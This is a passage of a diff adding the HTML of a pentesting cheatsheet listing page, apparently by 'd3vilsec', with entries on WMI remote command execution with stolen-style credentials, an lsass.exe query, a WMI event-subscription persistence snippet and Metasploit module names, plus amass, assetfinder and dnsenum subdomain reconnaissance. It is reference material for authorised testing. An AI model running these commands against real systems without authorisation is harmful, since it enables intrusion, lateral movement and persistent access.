Create ` -ArgumentList &#34;cmd.exe /c whoami &gt; C:\output.txt&#34; ` -ComputerName &lt;ip&gt; -Credential $cred # Check output Get-WmiObject -Class CIM_DataFile -Filter &#34;Name=&#39;C:\\output.txt&#39;&#34; ` -ComputerName &lt;ip&gt; -Credential $cred wmic (Legacy CLI — Windows) :: Local wmic os get Caption,Version,BuildNumber wmic process list brief wmic useraccount list brief wmic group list brief wmic service where &#34;State=&#39;Running&#39;&#34; list brief wmic product get Name,Version :: Installed software wmic startupinfo list full :: Remote wmic /node:&lt;ip&gt; /user:&lt;user&gt; /password:&lt;pass&gt; os get Caption wmic /node:&lt;ip&gt; /user:&lt;user&gt; /password:&lt;pass&gt; process call create &#34;cmd.exe /c whoami &gt; C:\out.txt&#34; wmic /node:&lt;ip&gt; /user:&lt;user&gt; /password:&lt;pass&gt; useraccount list brief WQL Queries # WQL = WMI Query Language (SQL-like) Get-WmiObject -Query &#34;SELECT * FROM Win32_Process WHERE Name=&#39;lsass.exe&#39;&#34; Get-WmiObject -Query &#34;SELECT * FROM Win32_Service WHERE StartMode=&#39;Auto&#39; AND State=&#39;Stopped&#39;&#34; Get-WmiObject -Query &#34;SELECT * FROM Win32_UserAccount WHERE LocalAccount=True&#34; Metasploit use exploit/windows/smb/psexec # Uses WMI/DCOM under the hood use exploit/windows/local/wmi # Post-exploitation WMI persistence use auxiliary/scanner/winrm/winrm_wql # WQL via WinRM WMI Persistence (Post-Exploitation) # Create permanent WMI event subscription (fileless persistence) $filter = Set-WmiInstance -Class __EventFilter -Namespace &#34;root\subscription&#34; -Arguments @{ Name = &#34;PentestFilter&#34; EventNameSpace = &#34;root\cimv2&#34; QueryLanguage = &#34;WQL&#34; Query = &#34;SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA &#39;Win32_PerfFormattedData_PerfOS_System&#39;&#34; } Key Differences: WMI vs WinRM vs PSExec Method Port Protocol Auth WMI/DCOM 135 &#43; dynamic DCOM/RPC NTLM/Kerberos WinRM 5985/5986 HTTP/HTTPS NTLM/Kerberos PSExec 445 SMB NTLM/Kerberos </p>
+  </div>
+  <footer class="entry-footer">
+
+<span>3 min</span>&nbsp;·&nbsp;<span>d3vilsec</span></footer>
+  <a class="entry-link" aria-label="post link to " href="http://localhost:1313/cheatsheets/pentesting/footprinting/wmi/"></a>
+</article>
+
+<article class="post-entry"> 
+  <header class="entry-header">
+    <h2 class="entry-hint-parent">
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p>amass Cheatsheet Type: Actively maintained subdomain discovery — extensive data sources &amp; tool integrations
+Installation sudo apt install amass # or go install -v github.com/owasp-amass/amass/v4/...@master # or snap install amass Subcommands Subcommand Description enum Subdomain enumeration (main command) intel Collect intel about an organisation viz Visualise enumeration results track Track differences between enumerations db Interact with the graph database enum — Subdomain Enumeration # Basic passive enumeration amass enum -passive -d example.com # Active enumeration (DNS resolution &#43; brute force) amass enum -active -d example.com # Active with brute force amass enum -brute -d example.com # Brute force with wordlist amass enum -brute -w wordlist.txt -d example.com # Multiple domains amass enum -d example.com -d example.org # Domains from file amass enum -df domains.txt # Limit data sources amass enum -passive -d example.com -src # Output to file amass enum -d example.com -o output.txt # Output to JSON amass enum -d example.com -json output.json # Show data sources in results amass enum -d example.com -src # Verbose amass enum -v -d example.com # Set timeout (minutes) amass enum -d example.com -timeout 30 # Use specific resolvers amass enum -d example.com -r 8.8.8.8,1.1.1.1 # Use resolver list amass enum -d example.com -rf resolvers.txt # Exclude data sources amass enum -d example.com -exclude CrtSearch # Only specific data sources amass enum -d example.com -include Wayback,CrtSearch Common Flags (enum) Flag Description -d &lt;domain&gt; Target domain -df &lt;file&gt; File with list of domains -passive Passive only (no DNS resolution) -active Active DNS (zone transfer, cert grabbing) -brute Enable brute force -w &lt;wordlist&gt; Wordlist for brute force -o &lt;file&gt; Output results to file -json &lt;file&gt; Output as JSON -src Show data source for each result -ip Show IP addresses -r &lt;resolvers&gt; Comma-separated resolver IPs -rf &lt;file&gt; File of resolver IPs -timeout &lt;n&gt; Timeout in minutes -v Verbose -config &lt;file&gt; Config file path -dir &lt;path&gt; Directory for output/database intel — Org Recon # Find domains by organisation name amass intel -org &#34;Target Corp&#34; # Reverse whois amass intel -whois -d example.com # ASN lookup amass intel -asn 12345 # Find domains from IP/CIDR amass intel -ip 192.168.1.0/24 # Find ASN from domain amass intel -d example.com -whois Configuration File Config file at ~/.config/amass/config.ini (or specify with -config):
+...</p>
+  </div>
+  <footer class="entry-footer">
+
+<span>3 min</span>&nbsp;·&nbsp;<span>d3vilsec</span></footer>
+  <a class="entry-link" aria-label="post link to " href="http://localhost:1313/cheatsheets/pentesting/information-gathering/dns-and-subdomains/amass/"></a>
+</article>
+
+<article class="post-entry"> 
+  <header class="entry-header">
+    <h2 class="entry-hint-parent">
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p>assetfinder Cheatsheet Type: Simple, lightweight subdomain finder using multiple passive data sources — ideal for quick recon
+Installation go install github.com/tomnomnom/assetfinder@latest # Binary ends up in ~/go/bin/assetfinder # Or download pre-built binary wget https://github.com/tomnomnom/assetfinder/releases/latest/download/assetfinder-linux-amd64.tgz tar xf assetfinder-linux-amd64.tgz mv assetfinder /usr/local/bin/ Basic Usage assetfinder &lt;domain&gt; assetfinder example.com Flags Flag Description --subs-only Show only subdomains (filter out related domains / TLD variants) Common Commands # All results (subdomains &#43; related domains) assetfinder example.com # Subdomains only (most common usage) assetfinder --subs-only example.com # Save to file assetfinder --subs-only example.com &gt; subdomains.txt # Multiple domains from stdin cat domains.txt | xargs -I{} assetfinder --subs-only {} # Pipe into other tools assetfinder --subs-only example.com | httprobe # Check live hosts assetfinder --subs-only example.com | sort -u # Deduplicate Data Sources Used crt.sh (Certificate transparency logs) certspotter (SSL cert monitoring) hackertarget (Passive DNS) threatcrowd (Threat intelligence) wayback (Wayback Machine / archive.org) dnsdumpster (DNS recon service) facebook CT (Facebook certificate transparency) virustotal (Passive DNS) findsubdomains.com Pipeline Examples # Find subdomains → probe for live web servers → save assetfinder --subs-only example.com | httprobe | tee live_hosts.txt # Find subdomains → resolve to IPs assetfinder --subs-only example.com | \ xargs -I{} dig &#43;short {} | grep -v &#34;^$&#34; | sort -u # Find subdomains → run nmap on live ones assetfinder --subs-only example.com | \ httprobe | sed &#39;s/https\?:\/\///&#39; | \ xargs -I{} nmap -p 80,443 {} # Combine with other tools for coverage (assetfinder --subs-only example.com; \ subfinder -d example.com -silent; \ amass enum -passive -d example.com) | sort -u &gt; all_subs.txt Notes Passive only — does not brute force DNS or make queries to the target Fast and lightweight — great first pass before heavier tools No API keys needed for most sources (some may be rate-limited) Output may contain duplicates — always pipe through sort -u </p>
+  </div>
+  <footer class="entry-footer">
+
+<span>2 min</span>&nbsp;·&nbsp;<span>d3vilsec</span></footer>
+  <a class="entry-link" aria-label="post link to " href="http://localhost:1313/cheatsheets/pentesting/information-gathering/dns-and-subdomains/assetfinder/"></a>
+</article>
+
+<article class="post-entry"> 
+  <header class="entry-header">
+    <h2 class="entry-hint-parent">
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p>dnsenum Cheatsheet Type: Comprehensive DNS enumeration — dictionary &amp; brute-force subdomain discovery
+Installation sudo apt install dnsenum # or git clone https://github.com/fwaeytens/dnsenum.git Basic Usage dnsenum &lt;domain&gt; dnsenum example.com Common Flags Flag Description --dnsserver &lt;ns&gt; Use a specific DNS server -f &lt;wordlist&gt; Wordlist for subdomain brute force -r Enable recursive brute force on found subdomains -p &lt;pages&gt; Number of Google scraping pages (default: 5) -s &lt;results&gt; Maximum results from Google scraping -o &lt;file&gt; Output to XML file --enum Shortcut: enables brute force, threads, Google scraping --threads &lt;n&gt; Number of threads for brute forcing --noreverse Skip reverse lookup on found IP ranges --nocolor Disable colored output -v Verbose output --timeout &lt;s&gt; DNS query timeout in seconds Common Commands # Full enumeration with brute force dnsenum --dnsserver &lt;ns&gt; --enum -p 0 -s 0 -f wordlist.txt &lt;domain&gt; # Brute force with threads, no Google scraping dnsenum -f wordlist.txt --threads 20 --noreverse &lt;domain&gt; # Output to XML dnsenum -f wordlist.txt -o output.xml &lt;domain&gt; # Recursive brute force (enumerate found subdomains too) dnsenum -f wordlist.txt -r &lt;domain&gt; # Suppress Google scraping (clean/offline) dnsenum -p 0 -s 0 -f wordlist.txt &lt;domain&gt; # Use specific nameserver dnsenum --dnsserver 8.8.8.8 -f wordlist.txt &lt;domain&gt; What dnsenum Does Automatically 1. Queries A, NS, MX records 2. Attempts zone transfer (AXFR) on each nameserver 3. Google scraping for subdomains (unless -p 0 -s 0) 4. Reverse lookups on found IP ranges 5. Brute forces subdomains from wordlist (if -f provided) Recommended Wordlists /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt /usr/share/wordlists/dnsmap.txt Example Full Run dnsenum --dnsserver 8.8.8.8 \ --enum \ -p 0 -s 0 \ --threads 20 \ -f /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \ -o results.xml \ example.com </p>
+  </div>
+  <footer class="entry-footer">
+
+<span>2 min</span>&nbsp;·&nbsp;<span>d3vilsec</span></footer>
+  <a class="entry-link" aria-label="post link to " href="http://localhost:1313/cheatsheets/pentesting/information-gathering/dns-and-subdomains/dnsenum/"></a>
+</article>
+<footer class="page-footer">
+  <nav class="pagination">
+    <a class="prev" href="http://localhost:1313/cheatsheets/">
+      «&nbsp;Prev&nbsp;
+    </a>
+    <a class="next" href="http://localhost:1313/cheatsheets/page/3/">Next&nbsp;&nbsp;»
+    </a>
+  </nav>
+</footer>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2026 <a href="http://localhost:1313/">d3vilsec</a></span> · 
+
+    
+    
+    <span>
+        Powered by
+        <a href="https://gohugo.io/?utm_source=papermod" rel="noopener" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" id="top-link" class="top-link hidden" aria-label="go to top" title="Go to Top (Alt + G)" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+        stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevrons-up">
+        <polyline points="17 11 12 6 7 11"></polyline>
+        <polyline points="17 18 12 13 7 18"></polyline>
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu');
+    if (menu) {
+        
+        const scrollPosition = localStorage.getItem("menu-scroll-position");
+        if (scrollPosition) {
+            menu.scrollLeft = parseInt(scrollPosition, 10);
+        }
+        
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var toplink = document.getElementById("top-link");
+    window.onscroll = function () {
+        const scrollThreshold = window.innerHeight;
+        if (document.body.scrollTop > scrollThreshold || document.documentElement.scrollTop > scrollThreshold) {
+            toplink.classList.remove("hidden");
+        } else {
+            toplink.classList.add("hidden");
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        const html = document.querySelector("html");
+        if (html.dataset.theme === "dark") {
+            html.dataset.theme = 'light';
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            html.dataset.theme = 'dark';
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+</body>
+
+</html>
